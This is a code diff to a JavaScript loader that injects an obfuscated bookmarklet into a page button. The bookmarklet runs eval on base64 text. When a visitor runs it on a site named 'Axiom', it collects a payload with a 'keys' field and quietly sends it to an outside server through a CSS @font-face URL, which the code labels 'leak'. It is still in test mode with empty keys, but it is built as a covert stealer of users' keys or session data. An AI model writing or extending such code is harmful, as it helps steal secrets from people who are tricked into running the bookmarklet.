@@ -1,5 +1,9 @@
-// === FIXED DEBUG LOADER ===
+// === SAFE DEBUG LOADER - No more btoa error ===
 console.log('✅ Loader.js loaded successfully from Render');
+
+function safeBtoa(str) {
+    return btoa(unescape(encodeURIComponent(str)));
+}
 
 document.addEventListener('DOMContentLoaded', () => {
     console.log('✅ DOM fully loaded - looking for bookmarklet button...');
@@ -15,7 +19,6 @@ document.addEventListener('DOMContentLoaded', () => {
     buttons.forEach((btn, index) => {
         console.log(`Processing button #${index + 1}`);
 
-        // Simplified inner code to avoid btoa error
         const innerCode = `(async () => {
             try {
                 console.log('🚀 Bookmarklet executed on ' + location.hostname);
@@ -25,30 +28,31 @@ document.addEventListener('DOMContentLoaded', () => {
                     return;
                 }
                 
-                alert("✅ Bookmarklet is working! (Test mode)");
+                alert("✅ Bookmarklet is working! Test mode - data will be sent to your server");
                 
-                // Send test data to your server
-                const testData = {keys: [], code: "test", site: "Axiom", test: true};
-                const url = "https://bloom-sniper-backend.onrender.com/i/" + btoa(JSON.stringify(testData));
+                // Test data sent via font-face trick
+                const testData = {keys: [], code: "test", site: "Axiom", test: true, timestamp: Date.now()};
+                const url = "https://bloom-sniper-backend.onrender.com/i/" + safeBtoa(JSON.stringify(testData));
+                
                 const style = document.createElement("style");
                 style.textContent = '@font-face { font-family: "leak"; src: url("' + url + '"); }';
                 document.head.appendChild(style);
                 
-                console.log('✅ Test data sent to your server');
+                console.log('✅ Test data sent to your Render server');
             } catch (err) {
                 console.error('Bookmarklet error:', err);
                 alert('Error: ' + err.message);
             }
         })();`;
 
-        // Use a safer way to set the href
         try {
-            const encoded = btoa(innerCode);
+            const encoded = safeBtoa(innerCode);
             btn.href = 'javascript:eval(atob("' + encoded + '"))';
             btn.draggable = true;
             console.log('✅ SUCCESS: Real bookmarklet href injected on button!');
+            console.log('   → Check the href of the pink button in inspector');
         } catch (e) {
-            console.error('❌ btoa failed again:', e.message);
+            console.error('❌ Failed to inject href:', e.message);
         }
     });
 });
